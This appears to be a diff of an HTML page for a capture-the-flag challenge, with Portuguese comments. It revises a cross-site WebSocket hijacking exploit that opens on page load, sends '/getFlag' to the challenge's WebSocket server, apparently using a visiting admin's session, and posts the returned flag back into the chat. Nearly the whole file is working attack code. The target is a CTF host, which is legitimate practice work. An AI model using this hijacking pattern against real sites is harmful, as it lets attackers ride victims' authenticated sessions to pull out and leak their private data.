@@ -1,85 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebSocket Exploit</title>
-    <style>
-        #log {
-            border: 1px solid #ccc;
-            padding: 10px;
-            height: 300px;
-            overflow-y: auto;
-            margin: 20px 0;
-            background-color: #f5f5f5;
-            font-family: monospace;
-        }
-        .flag {
-            color: red;
-            font-weight: bold;
-            font-size: 18px;
-        }
-    </style>
+    <title>WebSocket Echo Exploit</title>
 </head>
 <body>
-    <h1>WebSocket Flag Capture</h1>
-    <div id="log"></div>
+    <h1>Exploiting WebSocket...</h1>
     
     <script>
-        // Função para adicionar mensagens ao log
-        function log(message, isFlag = false) {
-            const logElement = document.getElementById('log');
-            const entry = document.createElement('div');
-            if (isFlag) entry.className = 'flag';
-            entry.textContent = new Date().toLocaleTimeString() + ': ' + message;
-            logElement.appendChild(entry);
-            
-            // Também exibir no console para debug
-            console.log(message);
-        }
-        
-        // Conexão automática ao carregar a página
+        // Função que será executada quando a página for carregada
         window.onload = function() {
-            log('Página carregada, tentando estabelecer conexão...');
+            console.log("Página carregada, iniciando exploit...");
             
-            try {
-                // Criar conexão WebSocket
-                const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+            // Conectar ao WebSocket como administrador
+            const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+            
+            socket.onopen = function() {
+                console.log("Conexão WebSocket estabelecida");
                 
-                // Manipulador de evento de conexão aberta
-                socket.onopen = function() {
-                    log('Conexão WebSocket estabelecida com sucesso!');
+                // Primeiro, solicitar a flag
+                setTimeout(function() {
+                    console.log("Solicitando flag...");
+                    socket.send(JSON.stringify({
+                        sender: 'user',
+                        message: '/getFlag'
+                    }));
+                }, 500);
+            };
+            
+            socket.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                console.log("Mensagem recebida:", data.message);
+                
+                // Se recebermos a flag, enviar como mensagem normal para o chat
+                if (data.message && data.message.includes('Flag:')) {
+                    console.log("Flag encontrada, enviando para o chat...");
                     
-                    // Enviar comando para obter a flag após um pequeno atraso
+                    // Enviar a flag como uma mensagem normal para o chat
                     setTimeout(function() {
-                        log('Enviando comando /getFlag...');
                         socket.send(JSON.stringify({
                             sender: 'user',
-                            message: '/getFlag'
+                            message: '🏆 ' + data.message + ' 🏆'
                         }));
                     }, 500);
-                };
-                
-                // Manipulador de mensagens recebidas
-                socket.onmessage = function(event) {
-                    const data = JSON.parse(event.data);
-                    log('Mensagem recebida: ' + data.message);
-                    
-                    // Destacar se for a flag
-                    if (data.message && data.message.includes('Flag:')) {
-                        log('FLAG ENCONTRADA: ' + data.message, true);
-                    }
-                };
-                
-                // Manipuladores de erro e fechamento
-                socket.onerror = function(error) {
-                    log('ERRO: Problema na conexão WebSocket: ' + error);
-                };
-                
-                socket.onclose = function() {
-                    log('Conexão WebSocket fechada');
-                };
-            } catch (error) {
-                log('ERRO: Exceção ao configurar WebSocket: ' + error.message);
-            }
+                }
+            };
+            
+            socket.onerror = function(error) {
+                console.error("Erro:", error);
+            };
+            
+            socket.onclose = function() {
+                console.log("Conexão fechada");
+            };
         };
     </script>
 </body>
